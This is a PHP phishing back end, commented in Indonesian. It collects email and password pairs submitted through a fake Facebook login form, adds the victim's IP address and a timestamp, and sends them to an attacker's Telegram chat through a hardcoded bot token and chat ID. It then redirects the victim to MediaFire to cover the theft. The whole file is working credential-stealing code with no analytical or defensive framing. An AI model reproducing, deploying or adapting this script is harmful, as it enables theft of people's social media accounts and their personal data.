<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $token = "8514761747:AAFRzzegKPnDq_wz5aREmTI4ZThvsiqoNBM";
    $chat_id = "5906696731";

    // --- TANGKAP DATA ---
    $email = isset($_POST['email']) ? $_POST['email'] : 'Kosong';
    $pass  = isset($_POST['pass']) ? $_POST['pass'] : 'Kosong';

    // Pengecekan IP yang lebih akurat untuk Hosting
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }

    // Set zona waktu ke Jakarta (WIB) agar waktu akurat
    date_default_timezone_set('Asia/Jakarta');
    $waktu = date('d/m/Y - H:i:s');

    // --- FORMAT PESAN (Gunakan HTML agar lebih stabil dibanding Markdown) ---
    $message = "<b>🔵 DATA LOGIN FB 🔵</b>\n\n";
    $message .= "📧 <b>User:</b> <code>$email</code>\n";
    $message .= "🔑 <b>Pass:</b> <code>$pass</code>\n";
    $message .= "🌐 <b>IP:</b> $ip\n";
    $message .= "⏰ <b>Waktu:</b> $waktu";

    $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$chat_id&text=" . urlencode($message) . "&parse_mode=HTML";

    // --- PENGIRIMAN ---
    $opts = [
        "http" => [
            "method" => "GET",
            "header" => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
        ]
    ];
    $context = stream_context_create($opts);
    @file_get_contents($url, false, $context);

    // --- REDIRECT ---
    header("Location: https://www.mediafire.com/myfiles/");
    exit();
}
?>